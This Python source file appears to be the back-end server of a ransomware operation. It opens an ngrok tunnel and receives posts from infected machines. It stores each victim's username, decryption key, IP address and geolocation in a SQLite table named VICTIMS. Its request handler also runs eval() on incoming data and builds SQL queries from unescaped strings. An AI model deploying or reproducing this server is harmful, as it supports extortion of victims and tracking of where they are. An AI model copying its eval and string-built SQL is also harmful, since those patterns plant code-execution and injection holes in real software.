from lib import ngrok_url
from http.server import BaseHTTPRequestHandler, HTTPServer
import sqlite3

URL = ngrok_url.create_tunnel()
print(f"\n\tNGROK URL: {URL}\n")

connection = sqlite3.connect("Details.db")  

def createTable(connection):
    cursor = connection.cursor()
    cursor.execute("""CREATE TABLE IF NOT EXISTS VICTIMS(
        UniqueId VARCHAR2(50) PRIMARY KEY,
        UserName VARCHAR2(50) NOT NULL,
        DecryptionKey INT NOT NULL,
        IP VARCHAR2(40) NOT NULL,
        Latitude VARCHAR2(20) NOT NULL,
        Longitude VARCHAR2(20) NOT NULL,
        Location VARCHAR2(500) NOT NULL
        );
        """)
    print("Table created successfully!")
    connection.commit()


def execute(connection, query):
    cursor = connection.cursor()
    cursor.execute(query)
    connection.commit()
    print("Query executed.")

def insertValues(connection, id, user, key, ip, lat, long, location):
    cursor = connection.cursor()
    cursor.execute(f"INSERT INTO VICTIMS VALUES ('{id}', '{user}', {key}, '{ip}', '{lat}', '{long}', '{location}');")
    connection.commit()


class Server(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200, "Connected Successfully")
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(b"Connection Accepted!")

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        data = self.rfile.read(content_length)
        data = data.decode("utf-8")
        data = eval(data)
        id = data["uniqueId"]
        user = data["user"]
        key = data["key"]
        ip = data["ip"]
        lat = data["latitude"]
        long = data["longitude"]
        location = data["location"]
        self.send_response(200)
        self.end_headers()
        insertValues(connection, id, user, key, ip, lat, long, location)
        

if __name__ == "__main__":
  
    createTable(connection)
    WebServer = HTTPServer(("localhost", 8000), Server)
    WebServer.serve_forever()
